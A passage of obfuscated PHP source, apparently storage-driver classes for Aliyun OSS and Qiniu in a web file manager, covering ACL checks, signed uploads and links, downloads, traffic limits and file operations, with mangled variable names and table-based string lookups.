$this->fileList($Âˆ´šÏ, $©¡±³êá[12], !0); $ŠÈğû» = array_to_keyvalue($­°¼£Àî[$©¡±³êá[96]], $©¡±³êá[42]); foreach ($­°¼£Àî[$©¡±³êá[95]] as $§·İäñŸ) { if (is_string($§·İäñŸ)) { $ŠÈğû»[$§·İäñŸ] = array($©¡±³êá[89] => 0); } } return $this->listAllFiles($Âˆ´šÏ, $ŠÈğû»); } public function canRead($çşËÍÃ) { $©˜ÕÍÑ— =& $_SERVER[øşô´çË]; $ûä›×¯Ä = $this->pathAcl($çşËÍÃ); return $ûä›×¯Ä == $©˜ÕÍÑ—[1687] || $ûä›×¯Ä == $©˜ÕÍÑ—[651] ? !0 : !1; } public function canWrite($Ì³×ª¡Ä) { $ù¦¦¹ˆ = $this->pathAcl($Ì³×ª¡Ä); return $ù¦¦¹ˆ == $_SERVER[øşô´çË][651] ? !0 : !1; } public function pathAcl($¡ÂîÆş™) { $éôÂË´± =& $_SERVER[øşô´çË]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ñ¢–¿‹¯ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¡ÂîÆş™)); } catch (OSS\Core\OssException $ÊÄË „) { $this->writeLog(__FUNCTION__ . $éôÂË´±[222] . $ÊÄË „->getMessage()); return !1; } $×·Å²¤€ = $Ñ¢–¿‹¯ == $éôÂË´±[47] ? $this->bucketAcl : $Ñ¢–¿‹¯; if ($×·Å²¤€ == $éôÂË´±[1688]) { return $éôÂË´±[1687]; } if ($×·Å²¤€ == $éôÂË´±[1689]) { return $éôÂË´±[651]; } return $×·Å²¤€; } private function chmodPath($ç‹¿ĞôÃ, $Ù†â§ì÷ = '') { $­¯×ÓŠ¨ =& $_SERVER[øşô´çË]; $ó€Ö‡ÁÜ = empty($Ù†â§ì÷) ? $­¯×ÓŠ¨[1689] : $Ù†â§ì÷; $Ú¥Şš´’ = array($­¯×ÓŠ¨[47], $­¯×ÓŠ¨[239], $­¯×ÓŠ¨[1688], $­¯×ÓŠ¨[1689]); if (!in_array($ó€Ö‡ÁÜ, $Ú¥Şš´’)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ç‹¿ĞôÃ), $ó€Ö‡ÁÜ); } catch (OSS\Core\OssException $Õ¤±îÙ) { $this->writeLog(__FUNCTION__ . $­¯×ÓŠ¨[222] . $Õ¤±îÙ->getMessage()); return !1; } return !0; } public function getContent($ÇğÃˆŠ‡) { return $this->fileSubstr($ÇğÃˆŠ‡, -1); } public function setContent($Ø÷í¥•ã, $èË‹Ç°ì = '') { $óŞŒ‹Ì =& $_SERVER[øşô´çË]; try { $…Ú»éê = $this->trafficLimit($óŞŒ‹Ì[1690]); $èîõ«áÇ = $this->client->putObject($this->bucket, $this->pathEncode($Ø÷í¥•ã), $èË‹Ç°ì, $…Ú»éê); } catch (OSS\Core\OssException $óÛÌ¼¼†) { $this->writeLog(__FUNCTION__ . $óŞŒ‹Ì[222] . $óÛÌ¼¼†->getMessage()); return !1; } $æ·®ø€Ğ = array($óŞŒ‹Ì[1684] => trim($èîõ«áÇ[$óŞŒ‹Ì[1681]], $óŞŒ‹Ì[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ø÷í¥•ã))); $this->updateObjMeta($Ø÷í¥•ã, $æ·®ø€Ğ); return isset($èîõ«áÇ[$óŞŒ‹Ì[1691]][$óŞŒ‹Ì[303]]) ? !0 : !1; } private function updateObjMeta($ƒÕ»±Ë, $ÂÎıÅÌ) { $ƒÕ»±Ë = $this->pathEncode($ƒÕ»±Ë); try { $ß­Ì×± = array(OSS\OssClient::OSS_HEADERS => $ÂÎıÅÌ); $this->client->copyObject($this->bucket, $ƒÕ»±Ë, $this->bucket, $ƒÕ»±Ë, $ß­Ì×±); } catch (OSS\Core\OssException $šøáÃ½¦) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][222] . $šøáÃ½¦->getMessage()); return !1; } return !0; } public function upload($‘Öøå²†, $ğ°ã©¯‡, $Çüìùç = false, $­ğ´«å™ = REPEAT_REPLACE) { $‰ùŒŸ§Š =& $_SERVER[øşô´çË]; if (!$ğ°ã©¯‡ || !@file_exists($ğ°ã©¯‡)) { return !1; } $Â“”óíš = trim($‘Öøå²†, $‰ùŒŸ§Š[8]); $·Ï®Ø¼Ş = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($‰ùŒŸ§Š[1684] => @md5_file($ğ°ã©¯‡)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘Öøå²†))); $·Ï®Ø¼Ş = $this->trafficLimit($‰ùŒŸ§Š[1690], $·Ï®Ø¼Ş); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Â“”óíš), $ğ°ã©¯‡, $·Ï®Ø¼Ş); } catch (OSS\Core\OssException $Á™æş†) { $this->writeLog(__FUNCTION__ . $‰ùŒŸ§Š[222] . $Á™æş†->getMessage()); return !1; } return $this->getPathOuter($‘Öøå²†); } public function getHost() { $–¨§¸²Ş =& $_SERVER[øşô´çË]; $¨§İãŸ = explode($–¨§¸²Ş[218], parent::getHost()); return $¨§İãŸ[0] . $–¨§¸²Ş[218] . $this->bucket . $–¨§¸²Ş[10] . $¨§İãŸ[1]; } public function uploadFormData($íªÅàÍ, $’•åßÌÎ = 3600) { $şáƒË’ =& $_SERVER[øşô´çË]; if (!($™¢úÆ = $this->getHost())) { return !1; } $Û¹¼Ò³£ = $’•åßÌÎ; $£ìÛñ×Ä = date($şáƒË’[1692], time() + $Û¹¼Ò³£); $á”¢çªâ = new DateTime($£ìÛñ×Ä); $ûĞé´Æ = $á”¢çªâ->format(DateTime::ISO8601); $¾¹Öıï† = strpos($ûĞé´Æ, $şáƒË’[380]); $ûĞé´Æ = substr($ûĞé´Æ, 0, $¾¹Öıï†) . $şáƒË’[1693]; $Í‹Ï¥‚ñ = 1048576000 * 5; $Ùëğö­± = $this->pathFather($íªÅàÍ); $…©ÊÖ¨¥ = array($şáƒË’[272] => $ûĞé´Æ, $şáƒË’[275] => array(array($şáƒË’[1694], 0, $Í‹Ï¥‚ñ), array($şáƒË’[277], $şáƒË’[278], $Ùëğö­±))); $¡¨´ ¯€ = base64_encode(json_encode($…©ÊÖ¨¥)); $¶ûøÒ³È = base64_encode(hash_hmac($şáƒË’[1520], $¡¨´ ¯€, $this->secret, !0)); $õõƒºè = array($şáƒË’[1695] => $this->accessKey, $şáƒË’[287] => $¡¨´ ¯€, $şáƒË’[280] => $şáƒË’[271], $şáƒË’[1696] => $¶ûøÒ³È, $şáƒË’[216] => $™¢úÆ); $õõƒºè = $this->trafficLimit($şáƒË’[1690], $õõƒºè, !0); return $õõƒºè; } public function uploadMultiData($‡¿‡Œ‹Ï, $³Ÿô¿«Æ = 3600) { $šœ°·¬™ =& $_SERVER[øşô´çË]; if (!($Â¹¬ÄÔ¹ = $this->getHost())) { return !1; } $¦¼Ç«’Š = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‡¿‡Œ‹Ï)); return array($šœ°·¬™[291] => $¦¼Ç«’Š, $šœ°·¬™[216] => $Â¹¬ÄÔ¹ . $šœ°·¬™[8] . $this->pathEncode($‡¿‡Œ‹Ï), $šœ°·¬™[292] => gmdate($šœ°·¬™[1697]), $šœ°·¬™[105] => $‡¿‡Œ‹Ï); } public function uploadMultiAuth($À˜²¸êØ, $û ¤ŸÓø = array()) { if (isset($û ¤ŸÓø[$_SERVER[øşô´çË][293]])) { return $this->uploadPartAuth($À˜²¸êØ, $û ¤ŸÓø); } return $this->uploadListAuth($À˜²¸êØ, $û ¤ŸÓø); } private function uploadPartAuth($Äóµ´àê, $Àí›¬ú¶ = array()) { $ÕÂÄ³¡á =& $_SERVER[øşô´çË]; $·óßÁÁ× = $Àí›¬ú¶[$ÕÂÄ³¡á[105]]; $×Àšîšğ = $this->_getUploadAuth($·óßÁÁ×, $Àí›¬ú¶); $¯¤‡Ì‡È = array($ÕÂÄ³¡á[295] => $×Àšîšğ[$ÕÂÄ³¡á[295]], $ÕÂÄ³¡á[292] => $×Àšîšğ[$ÕÂÄ³¡á[292]]); if (isset($×Àšîšğ[$ÕÂÄ³¡á[1698]])) { $¯¤‡Ì‡È[$ÕÂÄ³¡á[1698]] = $×Àšîšğ[$ÕÂÄ³¡á[1698]]; } return $¯¤‡Ì‡È; } private function uploadListAuth($ÎÍªŞ±Ç, $–£ƒµÂö = array()) { $¬¬ãÙŸş =& $_SERVER[øşô´çË]; $‡®¼ó¨ø = $–£ƒµÂö[$¬¬ãÙŸş[105]]; $Ü ªÉŸ = $–£ƒµÂö[$¬¬ãÙŸş[291]]; $ø¬ÄëÕ­ = $this->client->listParts($this->bucket, $this->pathEncode($‡®¼ó¨ø), $Ü ªÉŸ); $©ÎÚ®âÎ = $ø¬ÄëÕ­->getListPart(); $ŸÌ‹ëûÅ = array(); foreach ($©ÎÚ®âÎ as $ı½ƒáè«) { $ŸÌ‹ëûÅ[] = array($¬¬ãÙŸş[306] => $ı½ƒáè«->getPartNumber(), $¬¬ãÙŸş[307] => trim($ı½ƒáè«->getETag(), $¬¬ãÙŸş[128])); } if (!$ŸÌ‹ëûÅ) { return !1; } $·¸§ …Ó = $this->_getUploadAuth($‡®¼ó¨ø, $–£ƒµÂö); return array($¬¬ãÙŸş[295] => $·¸§ …Ó[$¬¬ãÙŸş[295]], $¬¬ãÙŸş[292] => $·¸§ …Ó[$¬¬ãÙŸş[292]], $¬¬ãÙŸş[298] => $ŸÌ‹ëûÅ); } private function _getUploadAuth($Úã€¦ƒ½, $»¾¿š) { $Šø“¡Ñ× =& $_SERVER[øşô´çË]; $’›âƒƒ¸ = gmdate($Šø“¡Ñ×[1697]); $Åáì¹ëµ = isset($»¾¿š[$Šø“¡Ñ×[293]]) ? $Šø“¡Ñ×[263] : $Šø“¡Ñ×[297]; $ºÆü¨ÎÀ = array_intersect_key($»¾¿š, array_flip(array($Šø“¡Ñ×[293], $Šø“¡Ñ×[291]))); ksort($ºÆü¨ÎÀ); $Ò­¡‘¢ = $ºÆü¨ÎÀ ? $Šø“¡Ñ×[86] . http_build_query($ºÆü¨ÎÀ, null, $Šø“¡Ñ×[294], PHP_QUERY_RFC3986) : $Šø“¡Ñ×[12]; $¥øê¥îû = array($Åáì¹ëµ, $Šø“¡Ñ×[12], $Šø“¡Ñ×[130], $’›âƒƒ¸, "\170\x2d\157\163\x73\x2d\x64\141\164\145\x3a{$’›âƒƒ¸}", $Šø“¡Ñ×[8] . $this->bucket . $Šø“¡Ñ×[8] . $Úã€¦ƒ½ . $Ò­¡‘¢); if (isset($»¾¿š[$Šø“¡Ñ×[293]])) { $‚ãš÷ÅÎ = $this->trafficLimit($Šø“¡Ñ×[1690], array(), !0); if ($‚ãš÷ÅÎ) { $Úã€¦ƒ½ = $Šø“¡Ñ×[1698]; array_splice($¥øê¥îû, 5, 0, $Úã€¦ƒ½ . $Šø“¡Ñ×[4] . $‚ãš÷ÅÎ[$Úã€¦ƒ½]); } } $°óÛòÚ = implode($Šø“¡Ñ×[19], $¥øê¥îû); $ıÙÔùÁï = base64_encode(hash_hmac($Šø“¡Ñ×[1520], $°óÛòÚ, $this->secret, !0)); $÷äøŠœˆ = $Šø“¡Ñ×[1667] . $this->accessKey . $Šø“¡Ñ×[4] . $ıÙÔùÁï; $÷…¼‡ = array($Šø“¡Ñ×[295] => $÷äøŠœˆ, $Šø“¡Ñ×[292] => $’›âƒƒ¸); if (!empty($‚ãš÷ÅÎ)) { $÷…¼‡ = array_merge($÷…¼‡, $‚ãš÷ÅÎ); } return $÷…¼‡; } public function download($Ëö¤ûŸƒ, $ä…€³Ü) { $ÜÑï»øƒ =& $_SERVER[øşô´çË]; if ($this->isFolder($Ëö¤ûŸƒ)) { return !1; } try { $­³™ç Ş = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ä…€³Ü); $­³™ç Ş = $this->trafficLimit($ÜÑï»øƒ[119], $­³™ç Ş); $this->client->getObject($this->bucket, $this->pathEncode($Ëö¤ûŸƒ), $­³™ç Ş); } catch (OSS\Core\OssException $‰í§±ü) { $this->writeLog(__FUNCTION__ . $ÜÑï»øƒ[222] . $‰í§±ü->getMessage()); return !1; } return $ä…€³Ü; } public function fileSubstr($Ëº¸ø¤ö, $ùœüúÀİ = 0, $ŸóÃš‘ò = false) { if ($ùœüúÀİ === -1) { $¡”Öãš = array(); } else { if ($ŸóÃš‘ò === !1) { $“ßŠÄø = $this->size($Ëº¸ø¤ö); } else { $“ßŠÄø = $ùœüúÀİ + $ŸóÃš‘ò - 1; } $¡”Öãš = array(OSS\OssClient::OSS_RANGE => "{$ùœüúÀİ}\55{$“ßŠÄø}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ëº¸ø¤ö), $¡”Öãš); } catch (OSS\Core\OssException $£½µº“ë) { $this->writeLog(__FUNCTION__ . $_SERVER[øşô´çË][222] . $£½µº“ë->getMessage()); think_exception($£½µº“ë->getMessage()); return !1; } } private function trafficLimit($ú¿ËÒø†, $ÚŸÑÒö¤ = array(), $­ØùË÷¯ = false) { $ºıß¸Ü =& $_SERVER[øşô´çË]; if ($ú¿ËÒø† == $ºıß¸Ü[1690] && $this->isUploadServer() || $ú¿ËÒø† == $ºıß¸Ü[119] && $this->isFileOutServer()) { return $ÚŸÑÒö¤; } $Ïíúá½ï = floatval($GLOBALS[$ºıß¸Ü[6]][$ºıß¸Ü[102]][$ºıß¸Ü[117]][$ú¿ËÒø†]) * 1024 * 1024 * 8; if (!$Ïíúá½ï) { return $ÚŸÑÒö¤; } $Ïíúá½ï = $Ïíúá½ï < 819200 ? 819200 : ($Ïíúá½ï > 838860800 ? 838860800 : $Ïíúá½ï); if ($­ØùË÷¯) { $ÚŸÑÒö¤[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ïíúá½ï); } else { if (!isset($ÚŸÑÒö¤[OSS\OssClient::OSS_HEADERS])) { $ÚŸÑÒö¤[OSS\OssClient::OSS_HEADERS] = array(); } $ÚŸÑÒö¤[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ïíúá½ï); } return $ÚŸÑÒö¤; } public function link($ŠÑ…˜ş‹, $ş¿ä×º¶ = array()) { $Ë¾şå™Ê =& $_SERVER[øşô´çË]; if (!$this->exist($ŠÑ…˜ş‹) || $this->isFolder($ŠÑ…˜ş‹)) { return !1; } try { $ş¿ä×º¶ = $this->trafficLimit($Ë¾şå™Ê[119], $ş¿ä×º¶, !0); $é¥™ö†ô = $this->client->signUrl($this->bucket, $this->pathEncode($ŠÑ…˜ş‹), 3600 * 12, $Ë¾şå™Ê[1601], $ş¿ä×º¶); return $this->getCdnLink($é¥™ö†ô); } catch (OSS\Core\OssException $çâŠ—õˆ) { $this->writeLog(__FUNCTION__ . $Ë¾şå™Ê[222] . $çâŠ—õˆ->getMessage()); return !1; } } public function fileOut($Œ“Ş†Ø¼, $ÒÎ„·é = false, $ƒøî¤Šô = false, $ èö‘à· = '') { $™¹íÎ¡© =& $_SERVER[øşô´çË]; if ($this->isFileOutServer()) { return $this->fileOutServer($Œ“Ş†Ø¼, $ÒÎ„·é, $ƒøî¤Šô, $ èö‘à·); } if (!$ƒøî¤Šô) { $ƒøî¤Šô = $this->pathThis($Œ“Ş†Ø¼); } $ƒøî¤Šô = rawurlencode($ƒøî¤Šô); $¸á· Œ = get_file_mime(get_path_ext($ƒøî¤Šô)); if ($¸á· Œ == $™¹íÎ¡©[258]) { return parent::fileOut($Œ“Ş†Ø¼, $ÒÎ„·é, $ƒøî¤Šô, $ èö‘à·); } $ÒÎ„·é = $ÒÎ„·é ? $™¹íÎ¡©[1699] : $™¹íÎ¡©[1700]; $çî¸’ö = array(OSS\OssClient::OSS_SUB_RESOURCE => $™¹íÎ¡©[1701] . rawurlencode("{$ÒÎ„·é}\x3b\x66\151\x6c\x65\x6e\141\155\x65\75{$ƒøî¤Šô}")); $ÉÉêè‰† = $this->link($Œ“Ş†Ø¼, $çî¸’ö); $this->fileOutLink($ÉÉêè‰†); } public function fileOutServer($É¢¨¹ÅÓ, $š›ıùê = false, $ü©öµ„İ = false, $ïçù®¾ = '') { parent::fileOut($É¢¨¹ÅÓ, $š›ıùê, $ü©öµ„İ, $ïçù®¾); } public function fileOutImage($§Ì§’Õ‹, $ôİ“–¤î = 250) { if ($this->size($§Ì§’Õ‹) > 1024 * 1024 * 20) { return $this->fileOutImageServer($§Ì§’Õ‹, $ôİ“–¤î); } $–Ú’¤• = array(OSS\OssClient::OSS_PROCESS => $_SERVER[øşô´çË][1664] . $ôİ“–¤î); $”ğ†õØ£ = $this->link($§Ì§’Õ‹, $–Ú’¤•); $this->fileOutLink($”ğ†õØ£); } public function fileOutImageServer($¬‘‹ì Œ, $ÍÇ³€Ïø = 250) { parent::fileOutImage($¬‘‹ì Œ, $ÍÇ³€Ïø); } public function fileOutLink($§ë€õ‰Â) { $ÁË­º¯É =& $_SERVER[øşô´çË]; if (!$this->isCdnHost() && substr($§ë€õ‰Â, 0, 7) == $ÁË­º¯É[226]) { $§ë€õ‰Â = $ÁË­º¯É[227] . substr($§ë€õ‰Â, 7); } header($ÁË­º¯É[182] . $§ë€õ‰Â); die; } public function hashMd5($É¡Ş‰¾Ñ, $ı·º‚Ìò = '') { $ú…›éÇµ =& $_SERVER[øşô´çË]; $íƒçìà— = $this->_objectMeta($É¡Ş‰¾Ñ); if (!$íƒçìà—) { return $ú…›éÇµ[12]; } if (!isset($íƒçìà—[$ú…›éÇµ[1684]]) && !empty($ı·º‚Ìò)) { $ìÛ˜àşÑ = $this->updateObjMeta($É¡Ş‰¾Ñ, array($ú…›éÇµ[1684] => $ı·º‚Ìò)); $íƒçìà—[$ú…›éÇµ[1684]] = $ìÛ˜àşÑ ? $ı·º‚Ìò : $ú…›éÇµ[12]; } return isset($íƒçìà—[$ú…›éÇµ[1684]]) ? strtolower($íƒçìà—[$ú…›éÇµ[1684]]) : $ú…›éÇµ[12]; } public function size($öÂİ¶ƒç) { $ôÜöÛáî = $this->objectMeta($öÂİ¶ƒç); return $ôÜöÛáî ? $ôÜöÛáî[$_SERVER[øşô´çË][89]] : 0; } public function info($è’ä°ë•) { if ($this->isFolder($è’ä°ë•)) { return $this->folderInfo($è’ä°ë•); } else { if ($this->isFile($è’ä°ë•)) { return $this->fileInfo($è’ä°ë•); } } return !1; } public function exist($×ÚÄœ¾¤) { return $this->isFile($×ÚÄœ¾¤) || $this->isFolder($×ÚÄœ¾¤); } public function isFile($ ş®•¯Ì) { return !$this->isFolder($ ş®•¯Ì) && $this->objectMeta($ ş®•¯Ì); } public function isFolder($„½ãşÚ) { return $this->cacheMethod($_SERVER[øşô´çË][187], $„½ãşÚ); } protected function objectMeta($ß»Æô¯’) { return $this->cacheMethod($_SERVER[øşô´çË][189], $ß»Æô¯’); } protected function _objectMeta($’ˆ•üõÓ) { $’Å ĞÖ =& $_SERVER[øşô´çË]; try { $ôğÏÈ¬ä = $this->client->getObjectMeta($this->bucket, $this->pathEncode($’ˆ•üõÓ)); } catch (OSS\Core\OssException $“©Í‰š) { $this->writeLog(__FUNCTION__ . $’Å ĞÖ[222] . $“©Í‰š->getMessage()); $ôğÏÈ¬ä = !1; } if ($ôğÏÈ¬ä) { $ôğÏÈ¬ä[$’Å ĞÖ[89]] = intval($ôğÏÈ¬ä[$’Å ĞÖ[1682]]); } return $ôğÏÈ¬ä; } protected function _isFolder($Ç€×Ö—ı) { $ù¦©•å¸ =& $_SERVER[øşô´çË]; if ($Ç€×Ö—ı == $ù¦©•å¸[12] || $Ç€×Ö—ı == $ù¦©•å¸[8]) { return !0; } $“°¬–û = array($ù¦©•å¸[1677] => $ù¦©•å¸[8], $ù¦©•å¸[1678] => rtrim($Ç€×Ö—ı, $ù¦©•å¸[8]) . $ù¦©•å¸[8], $ù¦©•å¸[1679] => 1, $ù¦©•å¸[1680] => $ù¦©•å¸[12]); $Â­¦–óé = $this->client->listObjects($this->bucket, $“°¬–û); if ($Â­¦–óé->getObjectList() || $Â­¦–óé->getPrefixList()) { return !0; } return !1; } public function writeLog($ˆ¿¤½¿Ø = '', $ŸÌÕœ‚± = false) { $¶ŠÛ°ğé =& $_SERVER[øşô´çË]; $ŞµôŞåÁ = in_array(ACTION, array($¶ŠÛ°ğé[220], $¶ŠÛ°ğé[221])); if (!$ŞµôŞåÁ && !GLOBAL_DEBUG) { return; } $ÙŸçŒ°™ = 0; if (stripos($ˆ¿¤½¿Ø, $¶ŠÛ°ğé[1702]) !== !1) { $ÙŸçŒ°™ = 1; $áÑßßÁ = explode($¶ŠÛ°ğé[1703], $ˆ¿¤½¿Ø); $ˆ¿¤½¿Ø = !empty($áÑßßÁ[1]) ? $áÑßßÁ[1] : $ˆ¿¤½¿Ø; } else { if (stripos($ˆ¿¤½¿Ø, $¶ŠÛ°ğé[1704])) { $ÙŸçŒ°™ = 2; $áÑßßÁ = explode($¶ŠÛ°ğé[1704], $ˆ¿¤½¿Ø); $áÑßßÁ = explode($¶ŠÛ°ğé[4], $áÑßßÁ[0]); $ˆ¿¤½¿Ø = !empty($áÑßßÁ[1]) ? $áÑßßÁ[1] : $ˆ¿¤½¿Ø; } } if ($ŞµôŞåÁ && I18n::getType() == $¶ŠÛ°ğé[1705]) { if ($ÙŸçŒ°™ == 1) { $ˆ¿¤½¿Ø = str_replace($¶ŠÛ°ğé[1706], $¶ŠÛ°ğé[1707], $ˆ¿¤½¿Ø); } else { if ($ÙŸçŒ°™ == 2) { $áÑßßÁ = explode($¶ŠÛ°ğé[222], $áÑßßÁ[0]); $§¶·ç÷Û = isset($áÑßßÁ[1]) ? $áÑßßÁ[1] : $¶ŠÛ°ğé[12]; $‹é’ù•Œ = array($¶ŠÛ°ğé[1708] => $¶ŠÛ°ğé[1709], $¶ŠÛ°ğé[1710] => $¶ŠÛ°ğé[1711], $¶ŠÛ°ğé[1712] => $¶ŠÛ°ğé[1713], $¶ŠÛ°ğé[1714] => $¶ŠÛ°ğé[1715], $¶ŠÛ°ğé[1716] => $¶ŠÛ°ğé[1717], $¶ŠÛ°ğé[1718] => $¶ŠÛ°ğé[1719], $¶ŠÛ°ğé[1720] => $¶ŠÛ°ğé[1721], $¶ŠÛ°ğé[1722] => $¶ŠÛ°ğé[1723], $¶ŠÛ°ğé[1724] => $¶ŠÛ°ğé[1725], $¶ŠÛ°ğé[1726] => $¶ŠÛ°ğé[1727]); if (isset($‹é’ù•Œ[$§¶·ç÷Û])) { $ˆ¿¤½¿Ø = $‹é’ù•Œ[$§¶·ç÷Û]; } } } if (stripos($ˆ¿¤½¿Ø, $¶ŠÛ°ğé[1728])) { $ˆ¿¤½¿Ø = $¶ŠÛ°ğé[1729]; } } if (!trim($ˆ¿¤½¿Ø)) { return; } parent::writeLog(trim($ˆ¿¤½¿Ø), $ŸÌÕœ‚±); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¾é×ù) { parent::__construct(); require_once SDK_DIR . $_SERVER[øşô´çË][1730]; $this->_init($¾é×ù); } public function _init($½½¤†§) { $ÈÚÉšœØ =& $_SERVER[øşô´çË]; $this->config = $½½¤†§; foreach ($½½¤†§ as $÷îÜÍíâ => $éøöª˜’) { if (isset($this->{$÷îÜÍíâ})) { $this->{$÷îÜÍíâ} = $éøöª˜’; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÈÚÉšœØ[1731] . LNG($ÈÚÉšœØ[1668])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($àåÖîéá, $ëğš¬úŞ = '', $‰çÖ‚€œ = REPEAT_RENAME) { if ($this->setContent($àåÖîéá, $ëğš¬úŞ)) { return $this->getPathOuter($àåÖîéá); } return !1; } public function mkdir($ö±ÆÖê, $ƒñƒÜ‚½ = REPEAT_SKIP) { $ˆéŞ¾Ìç =& $_SERVER[øşô´çË]; $Ñä»ßù£ = trim($ö±ÆÖê, $ˆéŞ¾Ìç[8]); if ($this->_isFolder($Ñä»ßù£)) { return $this->getPathOuter($Ñä»ßù£); } $ö±ÆÖê = $Ñä»ßù£ . $ˆéŞ¾Ìç[8]; $àŸé÷ƒ = get_path_this($Ñä»ßù£); $º“ó™Ä = $ö±ÆÖê . $àŸé÷ƒ; if (!$this->mkfile($º“ó™Ä)) { return !1; } if (!$this->moveFile($º“ó™Ä, $ö±ÆÖê)) { $this->delFile($º“ó™Ä); return !1; } return $this->getPathOuter($Ñä»ßù£); } public function copyFile($·ÈÔ¼§, $ï‰æ¾‚æ) { $“·¤×— = $this->bucketManager->copy($this->bucket, $·ÈÔ¼§, $this->bucket, $ï‰æ¾‚æ, !0); return $“·¤×— ? !1 : $this->getPathOuter($ï‰æ¾‚æ); } public function moveFile($×ª¹¨¬ê, $È—œÁÔŞ) { $‰¢Ÿû±¼ = $this->bucketManager->move($this->bucket, $×ª¹¨¬ê, $this->bucket, $È—œÁÔŞ, !0); return $‰¢Ÿû±¼ ? !1 : $this->getPathOuter($È—œÁÔŞ); } public function delFile($¦‰ª¤) { if (!$this->exist($¦‰ª¤)) { return !0; } $ëË¢Òğ = $this->bucketManager->delete($this->bucket, $¦‰ª¤); if (!$ëË¢Òğ) { return !0; } return $ëË¢Òğ->code() == 612 ? !0 : !1; } public function delFolder($®¾ ğÎù) { $–Ê¹ıˆñ =& $_SERVER[øşô´çË]; if (!$this->exist($®¾ ğÎù)) { return !0; } $this->listItemCache = !1; $ÓÅëÇÀ¶ = $this->fileList($®¾ ğÎù); $this->listItemCache = !0; $ÍÅï÷°ï = trim($®¾ ğÎù, $–Ê¹ıˆñ[8]) . $–Ê¹ıˆñ[8]; if (!empty($®¾ ğÎù) && $®¾ ğÎù !== $–Ê¹ıˆñ[238] && !in_array($ÍÅï÷°ï, $ÓÅëÇÀ¶[$–Ê¹ıˆñ[95]])) { $ÓÅëÇÀ¶[$–Ê¹ıˆñ[95]][] = $ÍÅï÷°ï; } $Úò Ş… = $this->delByBatch($ÓÅëÇÀ¶[$–Ê¹ıˆñ[96]]); if (!$Úò Ş…) { return !1; } $Úò Ş… = $this->delByBatch($ÓÅëÇÀ¶[$–Ê¹ıˆñ[95]]); if (!$Úò Ş…) { return !1; } return $this->delFile($ÍÅï÷°ï); } private function delByBatch($ÔØç•¶Ø) { foreach (array_chunk($ÔØç•¶Ø, 1000) as $³©úíúŸ) { $‘”‰Œ‚„ = $this->bucketManager->buildBatchDelete($this->bucket, $³©úíúŸ); list($©˜îôõ, $ç’äÓá„) = $this->bucketManager->batch($‘”‰Œ‚„); if ($ç’äÓá„) { return !1; } } return !0; } public function rename($ù¹”‘¹§, $æšáïˆğ) { return $this->renameObject($ù¹”‘¹§, $æšáïˆğ); } public function fileInfo($•ßã¤, $µ¥¯÷Šñ = false, $»Ã¿„ûş = array()) { $Õ²ôÙ¶ =& $_SERVER[øşô´çË]; $ìÂş³– = array($Õ²ôÙ¶[42] => $this->pathThis($•ßã¤), $Õ²ôÙ¶[97] => $this->getPathOuter($Õ²ôÙ¶[8] . $•ßã¤), $Õ²ôÙ¶[43] => $Õ²ôÙ¶[240], $Õ²ôÙ¶[89] => isset($»Ã¿„ûş[$Õ²ôÙ¶[1732]]) ? $»Ã¿„ûş[$Õ²ôÙ¶[1732]] : 0, $Õ²ôÙ¶[176] => $this->ext($•ßã¤)); if ($µ¥¯÷Šñ) { return $ìÂş³–; } $ìÂş³–[$Õ²ôÙ¶[241]] = $ìÂş³–[$Õ²ôÙ¶[98]] = 0; $ìÂş³–[$Õ²ôÙ¶[242]] = $ìÂş³–[$Õ²ôÙ¶[243]] = !0; if (empty($»Ã¿„ûş)) { $»Ã¿„ûş = $this->objectMeta($•ßã¤); if (!$»Ã¿„ûş) { return $ìÂş³–; } } if (isset($»Ã¿„ûş[$Õ²ôÙ¶[244]]) && $»Ã¿„ûş[$Õ²ôÙ¶[244]]) { $ìÂş³–[$Õ²ôÙ¶[245]] = $»Ã¿„ûş[$Õ²ôÙ¶[244]]; } if (isset($»Ã¿„ûş[$Õ²ôÙ¶[255]]) && $»Ã¿„ûş[$Õ²ôÙ¶[255]]) { $ìÂş³–[$Õ²ôÙ¶[245]] = $»Ã¿„ûş[$Õ²ôÙ¶[255]]; } if (isset($»Ã¿„ûş[$Õ²ôÙ¶[1733]])) { $ìÂş³–[$Õ²ôÙ¶[98]] = substr($»Ã¿„ûş[$Õ²ôÙ¶[1733]] . $Õ²ôÙ¶[12], 0, 10); } if (isset($»Ã¿„ûş[$Õ²ôÙ¶[1732]])) { $ìÂş³–[$Õ²ôÙ¶[89]] = $»Ã¿„ûş[$Õ²ôÙ¶[1732]]; } return $ìÂş³–; } public function folderInfo($µÀ¾ÓŒ, $ä ØÂ”ñ = false) { $Á‡º«şÔ =& $_SERVER[øşô´çË]; $Ë©ªè¾ = array($Á‡º«şÔ[42] => $this->pathThis($µÀ¾ÓŒ), $Á‡º«şÔ[97] => $this->getPathOuter($Á‡º«şÔ[8] . $µÀ¾ÓŒ), $Á‡º«şÔ[43] => $Á‡º«şÔ[88]); if ($ä 